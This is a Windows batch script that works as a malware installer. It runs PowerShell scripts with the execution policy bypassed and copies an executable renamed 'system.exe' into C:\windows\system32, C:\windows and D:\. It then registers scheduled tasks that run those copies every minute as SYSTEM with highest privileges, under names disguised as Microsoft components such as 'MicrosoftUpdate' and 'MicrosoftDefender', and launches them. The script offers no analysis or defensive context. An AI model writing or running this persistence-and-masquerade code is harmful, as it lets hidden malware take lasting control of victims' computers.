@echo off
powershell -ExecutionPolicy Bypass -File "system32.ps1"

powershell -ExecutionPolicy Bypass -File "D.ps1"

powershell -ExecutionPolicy Bypass -File "windows.ps1"


copy "system_attend_rename.exe" "system.exe" /y

copy "%CD%\system.exe" C:\windows\system32

copy "%CD%\system.exe" D:\


copy "%CD%\system.exe" C:\windows




SCHTASKS /Create /TR "c:\windows\system32\system.exe" /sc minute /mo 1 /ru "SYSTEM" /rl HIGHEST /F /TN MicrosoftUpdate


SCHTASKS /Create /TR "D:\system.exe" /sc minute /mo 1 /ru "SYSTEM" /rl HIGHEST /F /TN MicrosoftRuntimeBroker


SCHTASKS /Create /TR "C:\windows\system.exe" /sc minute /mo 1 /ru "SYSTEM" /rl HIGHEST /F /TN MicrosoftDefender




"C:\windows\system32\system.exe"
"C:\windows\system.exe"
"D:\system.exe"


